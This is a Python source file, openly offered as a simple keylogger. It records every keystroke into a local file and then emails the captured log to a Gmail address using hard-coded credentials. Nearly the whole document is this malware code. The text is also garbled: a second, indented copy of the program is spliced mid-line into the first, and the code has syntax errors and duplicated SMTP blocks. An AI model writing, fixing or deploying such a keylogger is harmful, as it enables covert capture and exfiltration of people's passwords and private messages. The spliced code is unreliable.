'''Modern keyloggers boast a plethora of features including the ability to document the precise date and time of each keystroke, the application in which keystrokes were inputted, and user-friendly log displays.

This particular program serves as a rudimentary keylogger with restricted capabilities, namely:

    Capturing and storing keystrokes in a file named "keylogger.txt"
    Transmitting the file's contents to an email address (utilizing a Gmail account without two-factor authentication)

To execute the program, navigate to the file directory in the terminal and input "python keylogger.py". To terminate the keylogger, simply press the Escape key.

Required modules:

    smtplib (pre-installed in Python)
    ssl (pre-installed in Python)
    pynput (requires installation via "pip install pynput")'''


    
import smtplib
import ssl
from pynput import keyboard

# Set up email parameters
sender_mail = "user@domain.com"  # Replace with your sender email
receiver_mail = "user@domain.com"  # Replace with your receiver email
password = "passcode"  # Replace with your sender email password
port = 587
message = """From: user@domain.com
To: user@domain.com                         
Subject: KeyLogs
Text: Keylogs 
"""

def write(text):
    """Function to write keystrokes to a file"""
    with open("keylogger.txt", 'a') as f:
        f.write(text)
        f.close()

# Establish connection with SMTP server
server = smtplib.SMTP('smtp.gmail.com', port)
    import smtplib
    import ssl 
    from pynput import keyboard


    sender_mail = "user@domain.com"
    receiver_mail = "user@domain.com"
    password = "passcode"
    port = 587
    message = """From: user@domain.com
                To: user@domain.com                         
                Subject: KeyLogs
                Text: Keylogs 
                """
                    

    def write(text):
        with open("keylogger.txt", 'a') as f:
            f.write(text)
            f.close()server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail, password)
server.sendmail(sender_mail, receiver_mail, message)
print("Email Sent to ", sender_mail)
server.quit()
    

    def on_key_press(key):
        try:
            if (key == keyboard.key.enter):
                write("\n")
            else:
                write(key.char)
        except AttributeError:
            if key == keyboard.key.backspace:
                write("\nBackspace Pressed\n")
            elif (key == keyboard.key.tab):
                write("\nTab Pressed\n")
            elif (key == keyboard.key.space):
                write(" ")
            else: 
                temp = repr(key)+" Pressed\n"
                write(temp)
                print("\n{} Pressed\n".format(key))


            
    def on_key_release(key):
        if (key ==keyboard.key.esc):
            return false



    with keyboard.Listener(on_press=on_key_press, on_key_release) as listener:
        listener.join

    with open("keylogger.txt", 'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()

context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail, password)
server.sendmail(sender_mail, receiver_mail, message)
print("Email Sent to ", sender_mail)
server.quit()
server.starttls()
server.login(sender_mail, password)

try:
    # Define function to handle key press event
    def on_key_press(key):
        """Function to handle key press event"""
        try:
            if (key == keyboard.key.enter):
                write("\n")
            else:
                write(key.char)
        except AttributeError:
            if key == keyboard.key.backspace:
                write("\nBackspace Pressed\n")
            elif (key == keyboard.key.tab):
                write("\nTab Pressed\n")
            elif (key == keyboard.key.space):
                write(" ")
            else: 
                temp = repr(key)+" Pressed\n"
                write(temp)
                print("\n{} Pressed\n".format(key))

    # Define function to handle key release event
    def on_key_release(key):
        """Function to handle key release event"""
        if (key ==keyboard.key.esc):
            return False  # Exiting listener on pressing Escape key

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

    # Read keystrokes from the file
    with open("keylogger.txt", 'r') as f:
        temp = f.read()
        message = message + str(temp)
        f.close()

    # Send email with key logs
    server.sendmail(sender_mail, receiver_mail, message)
    print("Email Sent to ", receiver_mail)

except Exception as e:
    print("An error occurred:", e)

finally:
    # Close SMTP connection
    server.quit()
